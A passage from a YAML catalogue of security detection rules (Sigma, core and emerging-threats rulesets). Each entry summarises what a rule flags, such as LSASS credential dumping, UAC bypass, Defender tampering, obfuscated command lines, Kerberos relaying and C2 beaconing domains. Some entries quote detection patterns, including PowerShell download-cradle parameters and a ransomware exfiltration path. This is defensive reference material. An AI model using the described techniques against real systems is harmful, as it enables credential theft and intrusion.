  Updated-Date: '2024_09_04'
a6a39bdb-935c-4f0a-ab77-35f4bbf44d33:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f439e7e0ee6d8bf994ddee6a26aef41d
  Ruleset: core
  Summary: This rule detects suspicious script executions from temporary folders on
    Windows systems. It monitors the creation of processes involving common scripting
    executables like `powershell.exe`, `pwsh.exe`, `mshta.exe`, `wscript.exe`, and
    `cscript.exe` when they are executed from paths that include temporary directories
    such as `\Windows\Temp`, `AppData\Local\Temp`, or similar locations. The rule
    is designed to identify potentially malicious behavior common in attacks where
    scripts are executed from directories meant for temporary storage, which is often
    a tactic used to evade detection. Certain command line patterns generally associated
    with legitimate administrative or system processes, such as output redirection
    with `Out-File`, JSON conversion, or specific behaviors related to VSCode and
    AWS EC2, are filtered out to reduce false positives.
  Updated-Date: '2024_09_03'
a6b33c02-8305-488f-8585-03cb2a7763f2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d0a765fb2253815599b229dcb83bc931
  Ruleset: core
  Summary: This rule detects the use of Windows Credential Editor (WCE) by identifying
    registry events that contain the target object "Services\WCESERVICE\Start." WCE
    is a tool often used for accessing and manipulating credentials in Windows environments,
    typically by malicious actors aiming to harvest sensitive information. Detecting
    this specific registry object can indicate an attempt to deploy or utilize WCE,
    making it critical to monitor for such activity to prevent potential credential
    theft.
  Updated-Date: '2024_09_03'
a6fc3c46-23b8-4996-9ea2-573f4c4d88c5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 202c5e089ad74990419e49b1e28d9169
  Ruleset: core
  Summary: This rule detects calls to the AtomicTestHarnesses command "Invoke-ATHRemoteFXvGPUDisablementCommand,"
    which is designed to exploit the "RemoteFXvGPUDisablement.exe" binary. The exploitation
    allows for executing custom PowerShell code via module load-order hijacking.
  Updated-Date: '2024_09_03'
a70dcb37-3bee-453a-99df-d0c683151be6:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: dcfd2059f8b045f4d01fa55db9257a97
  Ruleset: sigmahq
  Summary: This rule detects the execution of `netsh.exe` with the "advfirewall" and
    "set" options to modify existing firewall rules on a Windows system. The detection
    is based on the presence of specific command line parameters indicating an attempt
    to update firewall properties, such as enabling or disabling network discovery
    or file and printer sharing. Legitimate administrative activities, software installations,
    and removals may also trigger this rule.
  Updated-Date: '2024_09_04'
a743ceba-c771-4d75-97eb-8a90f7f4844c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fe6013b828b3ae31ef615028adfbdd53
  Ruleset: core
  Summary: This rule detects the pattern of User Account Control (UAC) Bypass that
    utilizes pkgmgr.exe and dism.exe. These executables are being leveraged to escalate
    privileges and evade defenses, specifically targeting high or system integrity
    levels to perform unauthorized actions.
  Updated-Date: '2024_09_03'
a746c9b8-a2fb-4ee5-a428-92bee9e99060:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4451d836c25eb32dd29d165ef5c6fcff
  Ruleset: sigmahq
  Summary: This rule detects the execution of PowerShell code through the `sqltoolsps.exe`
    utility, which is part of the standard utilities provided with Microsoft SQL Server
    Management Studio. Since script blocks are not logged when using this utility,
    it can be used to bypass protection mechanisms that rely on script block logging
    analysis.
  Updated-Date: '2024_09_04'
a753a6af-3126-426d-8bd0-26ebbcb92254:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ab7408aa9485fb83d14fa4a69eccec17
  Ruleset: sigmahq
  Summary: This rule detects potentially suspicious activities by identifying the
    execution of the "osacompile" command through applet or osascript processes on
    macOS systems. The presence of "osacompile" in the command line, when initiated
    by either '/applet' or '/osascript' processes, may indicate malicious behavior
    and is flagged for further investigation.
  Updated-Date: '2024_09_04'
a7664b14-75fb-4a50-a223-cb9bc0afbacf:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1aebde963cd19c3fb704d5e29ace9be1
  Ruleset: sigmahq
  Summary: This rule detects the execution of RemoteKrbRelay, a tool used for relaying
    Kerberos authentication to gain unauthorized access, by examining command line
    flags and portable executable (PE) metadata. Specifically, it identifies the presence
    of RemoteKrbRelay.exe in process creation logs, and checks for command line flags
    such as `-clsid`, `-target`, and `-victim`. It also looks for flags associated
    with specific attack techniques, including relaying to SMB with `-smb` and `--smbkeyword`,
    setting up Resource-Based Constrained Delegation (RBCD) with `-rbcd` and additional
    RBCD-specific flags, changing user passwords via LDAP with `-chp`, `-chpPass`,
    and `-chpUser`, and adding a group member through LDAP with `-addgroupmember`,
    `-group`, and `-groupuser`. This detection helps identify potentially malicious
    use of the RemoteKrbRelay tool.
  Updated-Date: '2024_09_04'
a77c1610-fc73-4019-8e29-0f51efc04a51:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e14cbae6c23c9f310a8ba15fe1aec031
  Ruleset: sigmahq
  Summary: This rule detects potential payload obfuscation activities via the command
    line on Windows systems. It identifies specific obfuscation patterns such as unusual
    character sequences and substitutions that suggest the use of techniques to evade
    detection or analysis. Examples of these patterns include '^^', '^|^', ',;,',
    ';;;;', ';; ;;', '(,(,', '%COMSPEC:~', and several variations of the 'cmd' command
    with inserted carets (^). These methods are often associated with an obfuscation
    tool known as Invoke-DOSfuscation, which is designed to help attackers hide their
    command line activities from standard detection measures.
  Updated-Date: '2024_09_04'
a7c3d773-caef-227e-a7e7-c2f13c622329:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: eb170b8d76d1ff030c06c1cb6dd7d0c4
  Ruleset: sigmahq
  Summary: This rule detects attackers employing tools with poor operational security
    defaults, specifically focusing on the use of sacrificial processes executed with
    improper arguments. These instances are often characterized by the execution of
    common Windows utilities such as `rundll32.exe`, `WerFault.exe`, `regsvcs.exe`,
    `regasm.exe`, and `regsvr32.exe` without the appropriate arguments that would
    typically be necessary for their legitimate function. Examples include rundll32.exe
    or WerFault.exe being executed without any arguments, which is unusual and indicative
    of potential malicious activity. The rule helps identify misuse of these processes
    that may occur during attempts to inject malicious capabilities or evade defenses.
    Filters are applied to exclude benign use cases, such as updates for Microsoft
    Edge or Chrome, that might otherwise trigger false positives.
  Updated-Date: '2024_09_04'
a7cd7306-df8b-4398-b711-6f3e4935cf16:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 87c0a4eb3bf494303212b4aab291f1db
  Ruleset: emerging-threats
  Summary: This rule detects suspicious anomalies in the remote procedure call (RPC)
    service by monitoring specific subprocesses, such as those spawned by `svchost.exe`
    with the command line containing '-k RPCSS'. These anomalies may indicate attempts
    to exploit vulnerabilities like CVE-2022-26809, a remote procedure call runtime
    remote code execution vulnerability. This detection aims to identify potential
    malicious activities related to RPC service exploitation on Windows systems.
  Updated-Date: '2024_09_03'
a7e6b1f9-8d2c-4f1e-9a7d-63e4c8a2bf4c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 122c1231acb8099e249d461edec68c2f
  Ruleset: emerging-threats
  Summary: This rule detects the Kapeka Backdoor binary being loaded by rundll32.exe.
    The Kapeka loader deploys a backdoor, a DLL with the ".wll" extension that pretends
    to be a Microsoft Word Add-In. It monitors specific directory paths such as "ProgramData"
    and "AppData\Local" for the presence of this malicious DLL to identify potential
    threats.
  Updated-Date: '2024_09_03'
a7ee1722-c3c5-aeff-3212-c777e4733217:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8d040379e788fd14666b7133bdd783af
  Ruleset: core
  Summary: This rule detects attackers attempting to disable Windows Defender using
    PowerShell or the 'sc' command. It triggers on the usage of PowerShell with specific
    commands to disable behavior and runtime monitoring, and also identifies attempts
    to stop, delete, or disable the Windows Defender service using 'sc.exe'. This
    type of activity is commonly associated with defense evasion techniques used by
    malware, including ransomware like WastedLocker, to prevent detection and ensure
    persistence on compromised systems.
  Updated-Date: '2024_09_03'
a803dec9-d49f-4987-a7f5-e2148fcc460d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6ce58176f0b2e4ace315cca271be3fcd
  Ruleset: securityonion-resources
  Summary: This rule detects requests made to the Trivial File Transfer Protocol (TFTP)
    service on a Security Onion Intrusion Detection Honeypot (IDH) node, leveraging
    opencanary logs.
  Updated-Date: '2024_08_07'
a80d927d-ac6e-443f-a867-e8d6e3897318:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 056cf21e646f3bedfcdcd2a1a45c6965
  Ruleset: sigmahq
  Summary: This rule detects the deployment of pods within the kube-system namespace
    in Kubernetes, which could be intended to imitate legitimate system pods. Attackers
    can exploit this by naming their malicious pods similar to those created by Kubernetes
    controllers like Deployments or DaemonSets, which have random suffixes in their
    names, to avoid detection. For example, an attacker may deploy a backdoor container
    named kube-proxy-bv61v in the kube-system namespace alongside other administrative
    containers.
  Updated-Date: '2024_09_04'
a80f662f-022f-4429-9b8c-b1a41aaa6688:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9b48e5b90177a449e2ddb6f83fa0cd45
  Ruleset: sigmahq
  Summary: This rule detects any modifications made to the AutoStart Extensibility
    Point (ASEP) in the Windows registry related to Internet Explorer. It specifically
    monitors changes in registry keys under paths related to Internet Explorer, including
    subcategories like 'Toolbar', 'Extensions', and 'Explorer Bars'. The rule is designed
    to catch unauthorized or potentially malicious changes to these keys, which can
    indicate attempts to maintain persistence on a system. Certain legitimate activities,
    such as software installation or administrative tasks, may also trigger this rule,
    leading to false positives.
  Updated-Date: '2024_09_04'
a8322756-015c-42e7-afb1-436e85ed3ff5:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9d02cf75ac242b97b94e150c54c7f9ac
  Ruleset: sigmahq
  Summary: This rule detects IP addresses that perform DNS lookups associated with
    common Tor proxies. It specifically identifies queries for various Tor-related
    domains such as 'tor2web.org', 'onion.to', and 'hiddenservice.net', among others.
    The rule is intended to highlight potential exfiltration activities where malicious
    actors might be using Tor proxies to anonymize and route their traffic through
    compromised systems. The detection source is DNS logs collected from the Zeek
    network security monitor. This rule assists in identifying suspicious network
    activities potentially linked to privacy-focused networks like Tor.
  Updated-Date: '2024_09_04'
a84fc3b1-c9ce-4125-8e74-bdcdb24021f1:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3dcec38b6397e9f95f54b2dccca2e8aa
  Ruleset: core
  Summary: This rule detects an access attempt to the Primary Refresh Token (PRT)
    resource, which could potentially be used for lateral movement within an organization
    or for credential theft. The detection signals a high-risk event as it is an uncommon
    but significant occurrence.
  Updated-Date: '2024_09_03'
a85f7765-698a-4088-afa0-ecfbf8d01fa4:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4f17c0ecde0bf56760df16236a5cbae5
  Ruleset: sigmahq
  Summary: This rule detects the execution of LiveKD, a Sysinternals tool used for
    memory dumping and debugging on Windows systems. It identifies the tool's activity
    based on the presence of specific image names ('livekd.exe' or 'livekd64.exe')
    or the original file name 'livekd.exe' in the process creation logs. Any use of
    LiveKD should be investigated as it could either be for legitimate administration
    and debugging purposes or potential malicious activity aimed at evading defenses.
  Updated-Date: '2024_09_04'
a85ffc3a-e8fd-4040-93bf-78aff284d801:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ea88c700f1ba10afbb3d8069b74e45de
  Ruleset: sigmahq
  Summary: This rule detects the usage of the "sftp.exe" binary in Windows as a Living
    Off The Land Binary (LOLBIN) by identifying the abuse of the "-D" flag. Attackers
    may exploit this flag to attempt executing commands or launching processes using
    relative or absolute paths, such as "C:\Windows\System32\calc.exe" or similarly
    crafted paths. The rule focuses on instances where the command line contains specific
    patterns involving the "-D" flag and path manipulations, which could indicate
    an attempt to execute unauthorized binaries.
  Updated-Date: '2024_09_04'
a861d835-af37-4930-bcd6-5b178bfb54df:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: dd0b6042b577c3b95c8e51efb94d331e
  Ruleset: core
  Summary: This rule detects the use of native PowerShell Identity modules to query
    a domain for extracting Service Principal Names (SPNs) of a single computer, which
    is typically indicative of a Kerberos or Silver Ticket attack. Successful execution
    yields SPNs for the specified endpoint.
  Updated-Date: '2024_09_03'
a88d9f45-ec8a-4b0e-85ee-c9f6a65e9128:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 768af856f15523f5bf5223282a097dc6
  Ruleset: emerging-threats
  Summary: This rule detects the creation of PowerShell script files with specific
    names or suffixes associated with the FIN7 advanced persistent threat (APT) group,
    particularly those named "_64refl.ps1" or "host_ip.ps1." FIN7 is known for using
    these naming conventions in their PowerShell scripts. The rule is intended to
    identify potential malicious activity linked to this group, highlighting the likelihood
    of an emerging threat.
  Updated-Date: '2024_09_03'
a8f29a7b-b137-4446-80a0-b804272f3da2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 727d0032f1864ac392da3452abe7718b
  Ruleset: core
  Summary: This rule detects the use of Group Policy Object (GPO) scheduled tasks
    for persistence and execution, typically associated with deploying ransomware
    at scale. It identifies events where write access is performed on the ScheduledTasks.xml
    file within the SYSVOL share, indicating potential lateral movement through GPO
    modifications. This technique allows attackers to execute tasks across multiple
    systems, facilitating widespread malware distribution. Monitoring such activities
    is crucial, especially for changes originating from non-localhost IP addresses,
    to detect and mitigate potential threats effectively.
  Updated-Date: '2024_09_03'
a8f866e1-bdd4-425e-a27a-37619238d9c7:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bcd7572098bf55395cde02bf28b28b72
  Ruleset: sigmahq
  Summary: This rule detects the creation of hidden files or directories using the
    "::$index_allocation" stream in the NTFS file system. This technique is often
    employed to obscure folders and files from common access tools like Windows Explorer
    and PowerShell, thereby evading detection and hindering analysis. It observes
    events where the target filename contains the "::$index_allocation" stream, indicative
    of attempts to create hidden directories for potentially malicious purposes. The
    creation of such directories can interfere with standard file-system operations
    and is generally unlikely to occur under normal circumstances.
  Updated-Date: '2024_09_04'
a902d249-9b9c-4dc4-8fd0-fbe528ef965c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9d5f48b6bd837cfa54fb4b9d7e8ed32e
  Ruleset: emerging-threats
  Summary: This rule detects exploitation attempts targeting the CVE-2023-22518 vulnerability
    in Confluence Data Center and Confluence Server, where attackers can exploit specific
    vulnerable endpoints to create administrative accounts and execute arbitrary commands.
    The detection focuses on certain POST requests to identified URIs that indicate
    potential exploit actions. This monitoring helps identify unauthorized access
    and exploitation activities attempting to leverage this known security flaw. The
    vulnerability was extensively documented and can lead to severe security breaches
    if left unaddressed.
  Updated-Date: '2024_09_03'
a94cdd87-6c54-4678-a6cc-2814ffe5a13d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0ca3e9a0bd3246fedd69103e142b7d78
  Ruleset: sigmahq
  Summary: This rule detects modifications to Unix shell configuration files, which
    may indicate that adversaries are trying to establish persistence by executing
    malicious commands whenever a new shell session is initiated. The rule monitors
    specific files, such as /etc/shells, /etc/profile, /etc/bash.bashrc, /etc/zsh/zshrc,
    and various others located in the /root and /home directories. Unauthorized changes
    to these files can be a sign of malicious activity aiming to automate command
    execution upon shell activation.
  Updated-Date: '2024_09_04'
a95b9b42-1308-4735-a1af-abb1c5e6f5ac:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ea0d4b949c1d55295e11ba9f08e04b0a
  Ruleset: core
  Summary: This rule detects suspicious Discretionary Access Control List (DACL) modifications
    performed using the "Set-Service" cmdlet with the "SecurityDescriptorSddl" flag,
    which is available starting from PowerShell 7. Such modifications can be used
    to hide services or make them unstopabble, thus representing a potential security
    threat. The rule specifically scrutinizes processes involving 'pwsh.exe' and command
    lines that include '-SecurityDescriptorSddl', '-sd', and various permission entries
    like ';;;IU', ';;;SU', ';;;BA', ';;;SY', and ';;;WD'. These indicators may suggest
    an attempt to alter service security descriptors in ways that may facilitate persistence
    or evasion techniques.
  Updated-Date: '2024_09_03'
a96970af-f126-420d-90e1-d37bf25e50e1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 00086e3f3d1f90207c3ffbf0d930083c
  Ruleset: sigmahq
  Summary: This rule detects the use of Windows 8.3 short names in image paths, which
    can serve as a method to evade image detection. The rule identifies processes
    where the image path contains "~1\" or "~2\". It filters out benign instances
    where specific parent images, products, descriptions, or companies are involved,
    such as Dism.exe, cleanmgr.exe, and InstallShield components. Additionally, it
    recognizes installers operating from temporary directories with executable names
    ending in "~1\unzip.exe" or "~1\7zG.exe" to reduce false positives. Applications
    may occasionally use this notation and could generate false positives, necessitating
    investigation of both parent and child processes.
  Updated-Date: '2024_09_04'
a9723fcc-881c-424c-8709-fd61442ab3c3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c97b9ad17447ce92dc1a0ea352ab08b0
  Ruleset: sigmahq
  Summary: This rule detects the use of PowerShell commands to collect internal system
    information which may then be exported to a temporary directory. The monitored
    commands include retrieving data about services, files, and processes, indicated
    by the presence of 'Get-Service', 'Get-ChildItem', and 'Get-Process' in the PowerShell
    script block logging. The detection aims to identify potential adversarial actions
    intending to gather and export reconnaissance data within a Windows environment.
  Updated-Date: '2024_09_04'
a982fc9c-6333-4ffb-a51d-addb04e8b529:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f9a1648c9dd324313975d433976ae5a0
  Ruleset: sigmahq
  Summary: This rule detects modifications to the registry settings related to Windows
    Defender exclusions. Such changes could indicate an attempt to add paths, file
    types, or processes to the exclusions list of Windows Defender, which is a potential
    tactic for defense evasion used by attackers. It is important to monitor these
    registry changes as legitimate administrator actions can also trigger such alterations.
  Updated-Date: '2024_09_04'
a9b6c011-ab69-4ddb-bc0a-c4f21c80ec47:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e810d19280c37bbe25cbd5d826e9e5c7
  Ruleset: core
  Summary: This rule detects tampering with Windows attachment manager settings policies
    associations, specifically alterations to registry keys that manage default file
    type risks. It looks for modifications in the registry path '\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations\'
    indicating changes to settings that could reduce the default risk level of certain
    file types. Specific file types monitored include '.zip', '.rar', '.exe', '.bat',
    '.com', '.cmd', '.reg', '.msi', '.htm', and '.html'. Such modifications could
    signify an attempt to lower security measures and make the system more vulnerable
    to potentially dangerous file types.
  Updated-Date: '2024_09_03'
a9d4d3fa-8fc0-41bc-80b1-30b9fda79d6f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e226f3a914f494b73dead2fb4e8990a9
  Ruleset: sigmahq
  Summary: This rule detects the creation of remote threads in command shell applications,
    such as "Cmd.EXE" and "PowerShell.EXE." This technique is commonly employed by
    malware, like IcedID, to inject and execute malicious code within legitimate processes.
  Updated-Date: '2024_09_04'
a9e416a8-e613-4f8b-88b8-a7d1d1af2f61:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 80b7fc86c23a43814f391157faef0080
  Ruleset: core
  Summary: This rule detects the execution of the CSharp interactive console (csi.exe)
    initiated by PowerShell on a Windows system. The detection is triggered when the
    process creation logs show that csi.exe is being launched by any of the PowerShell
    executables, including powershell.exe, pwsh.exe, or powershell_ise.exe. This activity
    may indicate suspicious behavior given that CSharp interactive console is not
    commonly invoked via PowerShell in legitimate use cases.
  Updated-Date: '2024_09_03'
aa03c712-75c6-438b-8d42-de88f2427e09:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: afcfe5eb47b38311eb1038b8f711f833
  Ruleset: emerging-threats
  Summary: This rule detects potential command-and-control (C2) beaconing activity
    associated with domains used in zero-day attacks on iOS devices. These attacks,
    revealed by Kaspersky and the Russian Federal Security Service (FSB), involve
    communication with specific domains such as addatamarket.net, backuprabbit.com,
    and cloudsponcer.com. The rule is configured to identify proxy log entries containing
    these domains, indicating possible emerging threats related to the Operation Triangulation
    campaign.
  Updated-Date: '2024_09_03'
aa0b3a82-eacc-4ec3-9150-b5a9a3e3f82f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 145aec5ee66beec342525453e96b8a37
  Ruleset: sigmahq
  Summary: This rule detects the usage of the "type" command to facilitate the download
    or upload of data from a WebDAV (Web Distributed Authoring and Versioning) server
    on a Windows system. The command involved typically includes specific patterns
    in the command line, such as 'type [filename] > \\\\' for uploads and 'type \\\\'
    for downloads. This activity may indicate malicious behavior associated with command-and-control
    techniques, particularly the use of legitimate built-in commands to transfer files
    surreptitiously. This method leverages the Windows "type" command in conjunction
    with network paths to exploit its functionality for data transfer purposes.
  Updated-Date: '2024_09_04'
aa1697b7-d611-4f9a-9cb2-5125b4ccfd5c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0c64fefcf599bf19e90275d79cf4f226
  Ruleset: core
  Summary: This rule detects unauthorized access attempts to the Local Security Authority
    Subsystem Service (LSASS) process on Windows systems. Specifically, it identifies
    instances where a process handle is obtained with a specific access mask, indicating
    a potential password dumper activity targeting the Security Account Manager (SAM)
    domain.
  Updated-Date: '2024_09_03'
aa2efee7-34dd-446e-8a37-40790a66efd7:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: eb824b8bcbdb793ac7efd078061ddf47
  Ruleset: sigmahq
  Summary: This rule detects the use of command prompt tools such as `tree.com`, `WMIC.exe`,
    `doskey.exe`, and `sc.exe` to gather and export internal data. Adversaries may
    use these tools in conjunction with redirecting outputs to temporary directories,
    such as `%TEMP%` or `%TMP%`, to automate the collection of internal system or
    network information for further exploitation.
  Updated-Date: '2024_09_04'
aa35a627-33fb-4d04-a165-d33b4afca3e8:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 798fc91aa6d914d9ef0be99bfa637a88
  Ruleset: core
  Summary: This rule detects remote access to the Local Security Authority Subsystem
    Service (LSASS) process via Windows Remote Management (WinRM), which could indicate
    credential dumping attempts using tools like Mimikatz. The detection focuses on
    instances where the target image is `lsass.exe` and the source image is `wsmprovhost.exe`,
    with specific access parameters. This type of activity is associated with credential
    access, execution, and lateral movement tactics in a network.
  Updated-Date: '2024_09_03'
aa3a6f94-890e-4e22-b634-ffdfd54792cc:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2fd3c5895f8667cde3df06fb86965a87
  Ruleset: core
  Summary: This rule detects an executable file located in the user's directory that
    is initiated by applications from the Microsoft Office suite, including Word,
    Excel, PowerPoint, Publisher, Visio, Access, and Equation Editor. The detection
    is focused on identifying suspicious binaries that could signify potential malicious
    activities, often linked to common attack tactics and techniques. Notably, operations
    involving the executable 'Teams.exe' are excluded from triggering this detection
    to reduce false positives.
  Updated-Date: '2024_09_03'
aa5b0a40-ed88-46aa-9fdc-0337b379ca9d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6323e7395f16eadcb05d36522a742ad0
  Ruleset: emerging-threats
  Summary: This rule detects specific command line executions used by Lace Tempest
    to download Cobalt Strike. Lace Tempest is known for using the PowerShell command
    parameters -nop, -w hidden, and -c IEX to invoke a web client download string
    functionality. This activity is indicative of malicious actions such as downloading
    and executing the Cobalt Strike payload, which is often used for penetration testing
    or malicious endeavors. The rule aims to capture these command patterns to facilitate
    early detection of potential threats.
  Updated-Date: '2024_09_03'
aa6f6ea6-0676-40dd-b510-6e46f02d8867:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 07f2d815b992ab81a16d7894b729b45d
  Ruleset: sigmahq
  Summary: This rule detects the execution of "curl.exe" using the "file://" protocol
    handler to read local files. "Curl.exe" is a command-line tool designed for transferring
    data with URLs, and this rule flags its use for accessing local file paths, which
    could indicate attempts to read or exfiltrate local content.
  Updated-Date: '2024_09_04'
aa7a3fce-bef5-4311-9cc1-5f04bb8c308c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4c31d288e66ffe40ad8f08bd059b6757
  Ruleset: sigmahq
  Summary: This rule detects PowerShell script calls to cmdlets used for exporting
    certificates from the local certificate store. It focuses on identifying activities
    involving commands like 'Export-PfxCertificate' and 'Export-Certificate', which
    threat actors may exploit to steal private keys from compromised systems. The
    rule filters out optional module exports to minimize false positives, as legitimate
    certificate exports by administrators might also trigger detections.
  Updated-Date: '2024_09_04'
aa8e035d-7be4-48d3-a944-102aec04400d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0cf85740b517886e143f85fc2966a613
  Ruleset: sigmahq
  Summary: This rule detects the execution of the Extrac32 utility, which downloads
    or copies files on Windows systems. It flags instances where the command line
    contains "extrac32.exe" or references a .cab file, along with specific command
    line options such as /C, /Y, or paths starting with double backslashes. This behavior
    may indicate suspicious activity associated with command-and-control techniques.
  Updated-Date: '2024_09_04'
aa92fd02-09f2-48b0-8a93-864813fb8f41:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 93144cbe0a2947d6d6c559624155e887
  Ruleset: emerging-threats
  Summary: This rule detects a specific command used by the Conti ransomware to exfiltrate
    sensitive data from the NTDS (NT Directory Services) database. The detection focuses
    on the usage of '7za.exe' combined with the destination path '\\C$\\temp\\log.zip',
    which indicates an attempt to archive and potentially transfer the NTDS data.
    This behavior is associated with malicious activity aimed at accessing and exporting
    critical authentication and directory information from Windows systems.
  Updated-Date: '2024_09_03'
aaa5b30d-f418-420b-83a0-299cb6024885:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9eef51a0af728a4fcd9c5eb10b5f3cba
  Ruleset: sigmahq
  Summary: This rule detects suspicious error messages related to the Remote Desktop
    Protocol (RDP) on Windows systems, indicating a potential exploitation attempt
    of CVE-2019-0708, widely known as BlueKeep. Detection is based on specific event
    IDs generated by the TermDD provider, helping identify attempts at exploiting
    this critical vulnerability.
  Updated-Date: '2024_09_04'
aaafa146-074c-11eb-adc1-0242ac120002:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ad5e7963c7f77b3f61a10206be8c222e
  Ruleset: core
  Summary: This rule detects the execution of the Hydra password-guessing tool by
    identifying specific command-line parameters associated with its use. Specifically,
    it looks for the presence of '-u' (username) and '-p' (password), as well as keywords
    '^USER^' and '^PASS^' in the command line. Hydra is a hack tool commonly used
    for brute-force attacks to gain unauthorized access to systems by systematically
    trying various combinations of usernames and passwords.
  Updated-Date: '2024_09_03'
aac2fd97-bcba-491b-ad66-a6edf89c71bf:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1b6a17562ce788b8a13cd24a3b632dde
  Ruleset: sigmahq
  Summary: This rule detects executable files being accessed via WebDAV, a web-based
    Distributed Authoring and Versioning protocol. Such activity can indicate malicious
    behavior, such as that observed in APT 29 operations, where attackers utilize
    WebDAV for command and control purposes. The rule specifically identifies web
    traffic with user agents and URIs containing 'WebDAV' and responses serving executable
    files ending in '.exe'. This helps in identifying potential threats linked to
    the exploitation of WebDAV for delivering malicious executables.
  Updated-Date: '2024_09_04'
aac6c4f4-87c7-4961-96ac-c3fd3a42c310:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 29845b67667e96865d6cc89dd33cad6b
  Ruleset: sigmahq
  Summary: This rule detects changes in global permission settings within Bitbucket,
    including events such as granting, removing, or requesting global permissions.
    Event categories monitored include 'Permissions', and specific actions include
    'Global permission remove request', 'Global permission removed', 'Global permission
    granted', and 'Global permission requested'. These detections are essential for
    identifying potential persistence and privilege escalation attempts.
  Updated-Date: '2024_09_04'
aae1243f-d8af-40d8-ab20-33fc6d0c55bc:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 00bd7e6ca5d61fcd6461ca148011d906
  Ruleset: sigmahq
  Summary: This rule detects the usage of the PsLogList utility, a Sysinternals tool,
    which may be employed to dump event logs for the purposes of discovering administrator
    accounts or deleting event logs. It triggers upon identifying specific command-line
    activities and file executions related to PsLogList, particularly when certain
    command-line flags are used to display or clear event logs. This behavior can
    indicate attempts to perform account discovery or cover tracks by tampering with
    event logs.
  Updated-Date: '2024_09_04'
aaf46cdc-934e-4284-b329-34aa701e3771:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4cd137ad7584a2701bf786a6969efa32
  Ruleset: sigmahq
  Summary: This rule detects uncommon child processes spawned by "BgInfo.exe" or "BgInfo64.exe".
    Such activity could indicate potential misuse of the BgInfo binary to execute
    external VBScript scripts, which is a tactic used for bypassing application whitelisting
    and other defensive measures.
  Updated-Date: '2024_09_04'
